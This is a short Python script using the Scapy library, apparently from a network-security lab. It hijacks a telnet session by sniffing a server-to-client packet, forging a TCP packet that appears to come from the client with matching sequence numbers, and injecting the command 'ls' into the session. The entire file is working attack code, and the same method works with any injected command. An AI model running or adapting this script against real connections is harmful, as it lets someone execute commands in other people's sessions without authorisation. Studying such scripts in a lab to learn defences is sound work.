#!/usr/bin/python3
from scapy.all import *

SRC  = "172.17.0.3"   # Server IP
DST  = "172.17.0.2"   # Client IP
PORT = 23             # Server telnet port

def spoof(pkt):
    old_ip  = pkt[IP]
    old_tcp = pkt[TCP]

    #############################################
    ip = IP(src = old_ip.dst, dst = old_ip.src)
    tcp = TCP(sport = old_tcp.dport, dport = old_tcp.sport, seq = old_tcp.ack, ack = old_tcp.seq + len(old_tcp.payload), flags = "A")
    data = "\rls\r"
    #############################################

    pkt = ip/tcp/data
    send(pkt,verbose=0)
    ls(pkt)
    quit()

f = 'tcp and src host {} and dst host {} and src port {}'.format(SRC, DST, PORT)
sniff(filter=f, prn=spoof, iface="docker0")